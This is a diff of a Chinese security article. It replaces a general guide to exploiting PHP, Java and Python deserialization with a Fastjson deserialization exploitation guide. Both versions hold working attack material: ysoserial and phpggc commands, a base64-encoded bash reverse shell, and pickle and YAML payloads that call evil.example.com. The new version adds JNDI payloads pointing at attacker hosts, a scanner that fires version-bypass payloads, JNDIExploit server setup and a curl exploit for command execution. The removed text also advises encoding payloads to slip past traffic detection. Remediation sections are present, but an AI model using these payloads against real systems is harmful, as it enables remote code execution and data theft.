@@ -1,150 +1,227 @@
-# 反序列化漏洞挖掘（PHP / Java / Python）
+# Fastjson 反序列化漏洞完整分析
 
-## 1. 漏洞概述
+> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP
 
-当应用把用户可控的数据作为反序列化输入，并且反序列化过程触发了类中定义的"魔术方法 / 析构函数 / 调用拦截器"时，攻击者可以通过构造特定对象，让这些"魔术方法"做非预期操作（写文件、调用其它类方法、查询数据库等），最终形成一条"Gadget Chain（POP 链）"实现任意命令执行。
+## 📋 提纲
 
-| 语言 | 核心反序列化函数 | 典型魔术方法 / 入口 |
-|------|-----------------|---------------------|
-| PHP | `unserialize()` | `__construct`、`__destruct`、`__wakeup`、`__toString`、`__invoke`、`__call`、`__get`、`__set` |
-| Java | `ObjectInputStream.readObject()` | `readObject()`、`readResolve()`、`toString()`、`compareTo()`、`HashMap.put()` |
-| Python | `pickle.loads()`、`yaml.load()`、`jsonpickle.decode()` | `__reduce__`、`__reduce_ex__`、`__setstate__`、`__getstate__` |
+1. Fastjson 概述
+2. 反序列化漏洞原理
+3. 各版本影响矩阵
+4. 漏洞检测方法
+5. 漏洞利用复现
+6. 修复与版本升级
 
-## 2. PHP 反序列化
+---
 
-### 2.1 识别注入点
+## 1. Fastjson 概述
 
-以下参数名和特征通常是信号：
+Fastjson是阿里巴巴开源的Java JSON库，国内使用极其广泛。
 
-- 参数中出现 `O:8:"TestClass":...`、`a:3:{i:0;s:...}` 这种 PHP 序列化字符串
-- Base64 解码后为上述格式
-- Cookie、Session、Token 中出现长串 Base64 / URL 编码
-- 调试参数 `?debug=1` 直接打印 `serialize()` 结果
+```
+影响面：几乎所有国内Java项目（Spring Boot/微服务/大数据）
+漏洞历史：
+  1.2.24  → AutoType默认开启（第一个RCE）
+  1.2.25  → 加入AutoType黑名单（被绕过）
+  1.2.47  → 缓存机制绕过黑名单（经典）
+  1.2.68  → 期望类绕过黑名单
+  1.2.80  → 最新已知绕过
 
-### 2.2 典型 POP 链思路
+核心问题：Fastjson的AutoType功能允许反序列化任意类→JNDI注入→RCE
+```
 
-1. **析构入口**：寻找 `__destruct` 或 `__wakeup` 中调用了本对象可控属性的方法；
-2. **中转方法**：`__toString` 被调用（对象被当作字符串拼接时）；
-3. **调用拦截**：`__call($name, $args)` 在调用不存在的方法时触发；
-4. **属性拦截**：`__get($name)` / `__set($name, $val)` 在访问不存在的属性时触发；
-5. **可调用对象**：`__invoke()` 在对象被当作函数调用时触发。
+---
 
-示例 POP 链（概念型）：
+## 2. 漏洞原理
 
-```php
-class A {
-    public $x;
-    function __destruct() { $this->x->run(); }   // 入口
+### 2.1 AutoType 机制
+
+```java
+// Fastjson 通过 @type 字段指定反序列化的类
+JSON.parseObject('{"@type":"com.example.User","name":"test"}')
+
+// AutoType 默认开启 → 可以反序列化任意有构造函数/setter的类
+// 攻击者可以指定恶意类：
+{
+  "@type":"com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName":"ldap://attacker.com/Exploit",
+  "autoCommit":true
 }
-class B {
-    public $y;
-    function run() { system($this->y); }          // 中转
-}
-
-// 构造 payload：
-$a = new A();
-$a->x = new B();
-$a->x->y = 'cat /etc/passwd';
-echo serialize($a);
+// JdbcRowSetImpl 的 setAutoCommit() → connect() → JNDI lookup → RCE
 ```
 
-### 2.3 常见 POP 链库
+### 2.2 攻击链
 
-- **Laravel**：多个版本存在 `Illuminate\Broadcasting\PendingBroadcast` → `__destruct` 触发 `Dispatcher->dispatch()` → RCE；
-- **ThinkPHP**：5.x 版本存在多套利用链（依赖存储驱动 / PDO）；
-- **WordPress 部分插件**：如 `cart66`、`revslider` 历史上存在反序列化；
-- **phpggc**：GitHub 项目，集成了大量框架的 POP 链生成脚本：
-
-```bash
-phpggc Laravel/RCE1 system 'id'   # 生成 Laravel RCE1 payload
-phpggc -b Laravel/RCE1 system 'id' # base64 输出
-phpggc -u Drupal7/FOO 'curl evil.com'
+```
+JSON请求 → @type指定恶意类 → Fastjson反序列化 → 
+调用setter/构造方法 → JNDI lookup → LDAP加载远程类 → RCE
 ```
 
-## 3. Java 反序列化
+---
 
-### 3.1 识别注入点
+## 3. 各版本影响与绕过
 
-- 请求 Body 以 `AC ED 00 05`（十六进制）开头 → Java 原生序列化（ObjectOutputStream）
-- JSON / XML 库调用 `ObjectMapper.readValue(input, Object.class)`、`XStream.fromXML()`、`XMLDecoder`、`SnakeYAML.load()`、`Kryo.readObject()`
-- 框架：Weblogic T3 协议、JBoss / JMX / RMI 端口、ActiveMQ OpenWire、Jenkins CLI、Shiro `rememberMe` Cookie
+| 版本 | 状态 | 利用链 |
+|------|------|--------|
+| ≤1.2.24 | 直接利用 | JdbcRowSetImpl/TemplatesImpl |
+| 1.2.25-1.2.41 | 黑名单被绕过 | 用`L`前缀+`;`后缀绕过类名校验 |
+| 1.2.42 | 修了L+; | 双写`LL`绕过 |
+| 1.2.43 | 修了LL | `[{`绕过 |
+| **1.2.47** | **经典绕过** | 利用缓存机制（MiscCodec）绕过黑名单 |
+| 1.2.48-1.2.67 | — | 各种期望类绕过 |
+| 1.2.68 | **期望类绕过** | 利用AutoCloseable接口 |
+| ≥1.2.80 | 最新修复 | 暂无公开绕过 |
 
-### 3.2 经典 Gadget
+---
 
-| Gadget | 核心类 | 利用链入口 |
-|--------|--------|-----------|
-| Commons-Collections 3.1/3.2.1 | `InvokerTransformer` / `ChainedTransformer` | `AnnotationInvocationHandler.readObject` |
-| CommonsBeanutils 1.8.3-1.9.2 | `BeanComparator`、`PropertyUtilsBean` | `PriorityQueue.readObject` 触发 compare |
-| JDK7u21 / JDK8u20 | `AnnotationInvocationHandler` + `LinkedHashSet` | 不依赖第三方库 |
-| ROME | `EqualsBean`、`ToStringBean` | `Object.equals` / `toString` |
-| Spring AOP | `JdkDynamicAopProxy` | `InvocationHandler` 拦截 |
-
-### 3.3 ysoserial 实战示例
-
-```bash
-# 1. 生成 CommonsCollections2 payload（需要 CommonsBeanutils + PriorityQueue）
-java -jar ysoserial.jar CommonsCollections2 'curl http://evil.example.com/rce' > payload.bin
-
-# 2. Base64 输出（常用于 HTTP Cookie / POST）
-java -jar ysoserial.jar CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4...}|{base64,-d}|{bash,-i}' | base64 -w0
-
-# 3. WebLogic / JBoss 场景：结合 T3 协议工具
-# 使用 GitHub 上 CVE-2015-4852 / CVE-2017-3248 相关 PoC
-# 将 payload.bin 写入工具对应的请求结构
-```
-
-### 3.4 常见利用靶场
-
-- Shiro `rememberMe`：AES key 弱密码 → 反序列化 payload
-- JBoss 5.x/6.x `/invoker/JMXInvokerServlet`、`/web-console/Invoker`
-- WebLogic T3 / IIOP 开放端口（常见于 7001）
-- Jenkins CLI `X-Stream` 协议
-
-## 4. Python 反序列化
-
-### 4.1 pickle 基本原理
-
-`pickle.loads(user_input)` 时会执行 `__reduce__()` 返回的 `(callable, args)`，可直接调用任意系统函数。
-
-最小 PoC：
+## 4. 漏洞检测
 
 ```python
-import pickle, os, base64
+#!/usr/bin/env python3
+"""Fastjson 漏洞检测"""
 
-class RCE:
-    def __reduce__(self):
-        return (os.system, ('curl evil.example.com/rce',))
+import requests
+import json
+import urllib3
+urllib3.disable_warnings()
 
-payload = pickle.dumps(RCE())
-print(base64.b64encode(payload).decode())
+class FastjsonDetector:
+    def __init__(self, target):
+        self.target = target
+
+    def detect_fastjson(self):
+        """检测是否使用Fastjson"""
+        # 发送畸形JSON，看报错中是否有fastjson字样
+        try:
+            resp = requests.post(
+                self.target,
+                data='{"test":',
+                headers={"Content-Type": "application/json"},
+                verify=False, timeout=10
+            )
+            if 'fastjson' in resp.text.lower() or 'com.alibaba.fastjson' in resp.text:
+                return {"detected": True, "evidence": "fastjson出现于错误信息"}
+        except:
+            pass
+        return {"detected": False}
+
+    def test_dnslog(self, dns_domain):
+        """DNS外带检测（最安全的检测方式）"""
+        payloads = [
+            # 1.2.24  payload
+            {"@type": "com.sun.rowset.JdbcRowSetImpl",
+             "dataSourceName": f"ldap://fastjson-1-2-24.{dns_domain}/test",
+             "autoCommit": True},
+            # 1.2.47 payload
+            {"a": {"@type": "java.lang.Class",
+             "val": "com.sun.rowset.JdbcRowSetImpl"},
+             "b": {"@type": "com.sun.rowset.JdbcRowSetImpl",
+             "dataSourceName": f"ldap://fastjson-1-2-47.{dns_domain}/test",
+             "autoCommit": True}},
+        ]
+
+        for i, payload in enumerate(payloads):
+            try:
+                resp = requests.post(
+                    self.target,
+                    json=payload,
+                    verify=False, timeout=10
+                )
+                print(f"[Payload {i+1}] Status: {resp.status_code}")
+            except:
+                pass
+
+        print(f"检查 {dns_domain} 的DNS查询记录")
+
+    def test_version_bypass(self, dns_domain):
+        """测试各类版本绕过payload"""
+        payloads = {
+            # 1.2.24 基础payload
+            "v1.2.24": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":f"ldap://24.{dns_domain}/","autoCommit":True},
+            # 1.2.47 缓存绕过
+            "v1.2.47": {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":f"ldap://47.{dns_domain}/","autoCommit":True}},
+            # 1.2.68 期望类绕过
+            "v1.2.68": {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":f"ldap://68.{dns_domain}/"},
+        }
+
+        for version, payload in payloads.items():
+            try:
+                resp = requests.post(self.target, json=payload, verify=False, timeout=5)
+                print(f"[{version}] Status: {resp.status_code}")
+            except:
+                pass
 ```
 
-### 4.2 常见注入点
 
-- Flask `app.secret_key` 泄漏后，`itsdangerous` 签名的 `session` 可反序列化
-- YAML 解析：`yaml.load(user_input)` 在 PyYAML 5.1 以下默认为 `FullLoader`，可触发 `!!python/object`
-- `jsonpickle.decode(user_input)` 直接支持 `py/object` 类型
-- `xmlrpc` / `marshall` / `shelve` 模块
+## 5. 漏洞利用
 
-yaml.load PoC：
+### 5.1 搭建JNDI服务
 
-```yaml
-!!python/object/apply:os.system
-- "curl http://evil.example.com/rce"
+```bash
+# 使用 JNDIExploit 或 marshalsec
+git clone https://github.com/feihong-cs/JNDIExploit.git
+cd JNDIExploit
+mvn clean package -DskipTests
+
+# 启动JNDI服务
+java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 10.0.0.1 -l 1389 -p 8080
+
+# 选项中：
+# -i: 攻击者IP
+# -l: LDAP监听端口
+# -p: HTTP端口（托管恶意class）
 ```
 
-## 5. 挖掘实战步骤
+### 5.2 发送利用Payload
 
-1. **识别输入**：通过 Burp 历史搜索 `unserialize` / `readObject` / `pickle` / `base64` 等关键字，定位可控反序列化输入点。
-2. **搜集类定义**：在 Java 场景使用 `jd-cli` / CFR 反编译，或阅读开源源码；在 PHP 场景通过 `phpggc` 列表确认可用 gadget。
-3. **构造 / 生成 payload**：使用 `phpggc` / `ysoserial` / `marshalsea` 生成对应链并编码。
-4. **命令回显**：如果目标不能直接回显，可以使用 DNSLog（如 `curl evil.ceye.io/$(whoami)`）、Burp Collaborator 或自建服务器回带结果。
-5. **流量变形**：对 payload 做 gzip/deflate/hex/base64 编码，或使用分块传输，绕过流量检测。
+```bash
+# Fastjson 1.2.47 经典利用
+curl -X POST https://target.com/api/json \
+  -H "Content-Type: application/json" \
+  -d '{
+    "a": {
+      "@type": "java.lang.Class",
+      "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b": {
+      "@type": "com.sun.rowset.JdbcRowSetImpl",
+      "dataSourceName": "ldap://10.0.0.1:1389/TomcatEcho",
+      "autoCommit": true
+    }
+  }'
 
-## 6. 修复建议
+# TomcatEcho 是一个无回弹的回显Payload
+# 执行命令：在Header中加 cmd: whoami → 响应头中返回结果
+```
 
-1. **禁止反序列化用户输入**：尽量使用 JSON / XML 等纯数据格式而非二进制对象流。
-2. **白名单类**：Java 场景实现自定义 `ObjectInputStream.resolveClass()`，仅允许明确列出的类；Python 场景使用 `yaml.safe_load` / `pickle` 仅接受可信签名数据。
-3. **升级第三方库**：及时升级 Commons-Collections、CommonsBeanutils、Spring、Shiro、JDK 等依赖。
-4. **最小化依赖**：移除未使用的第三方库，降低 gadget 可用面。
-5. **RASP / WAF**：部署 RASP 拦截危险反射调用；在边界阻断 T3、IIOP 等协议端口。
+---
+
+## 6. 修复方案
+
+```xml
+<!-- pom.xml -->
+<dependency>
+    <groupId>com.alibaba</groupId>
+    <artifactId>fastjson</artifactId>
+    <version>1.2.83</version>  <!-- 或 2.0.25+ -->
+</dependency>
+```
+
+```java
+// 代码层面关闭AutoType
+ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
+
+// 或升级到 Fastjson 2.x（默认关闭AutoType）
+import com.alibaba.fastjson2.JSON;
+```
+
+---
+
+## ✅ Fastjson Checklist
+
+- [ ] 全网Fastjson版本扫描
+- [ ] DNS外带检测
+- [ ] 各版本绕过payload测试
+- [ ] 升级到最新安全版本
+- [ ] 关闭AutoType或升级Fastjson2
+
+> 📚 延伸阅读：Vuln/002-Log4Shell | Vuln/008-Shiro | CTF/009-JNDI
